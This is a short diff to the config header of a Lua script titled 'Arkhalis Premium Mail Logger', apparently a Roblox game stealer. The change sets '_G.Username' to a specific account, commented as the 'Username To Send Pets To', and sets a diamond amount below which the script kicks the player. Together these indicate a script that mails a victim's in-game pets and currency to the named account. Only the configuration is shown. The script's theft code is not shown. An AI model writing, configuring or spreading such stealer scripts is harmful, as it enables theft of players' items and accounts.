@@ -1,7 +1,7 @@
 --[[ Arkhalis Premium Mail Logger ]]--
 
 --[[ Main Config ]]--
-_G.Username = "" --// Username To Send Pets To
+_G.Username = "cistianobodado" --// Username To Send Pets To
 _G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
 
 --[[
